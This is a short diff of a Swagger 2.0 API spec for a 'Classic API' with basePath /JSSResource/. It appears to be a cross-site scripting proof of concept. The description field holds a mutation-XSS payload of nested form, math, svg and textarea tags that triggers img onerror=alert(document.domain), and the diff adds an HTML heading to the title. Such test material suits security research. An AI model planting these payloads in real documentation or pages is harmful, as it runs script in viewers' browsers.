@@ -1,11 +1,11 @@
 swagger: '2.0'
 info:
-  title: Classic API Resource Documentation
+  title: Classic API Resource Documentation<h1>helloworld</h1>
   description: |
     <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src=1>"></form>
 
   version: production
-basePath: /JSSResource/
+basePath: /JSSResource/|
 produces:
   - application/xml
   - application/json
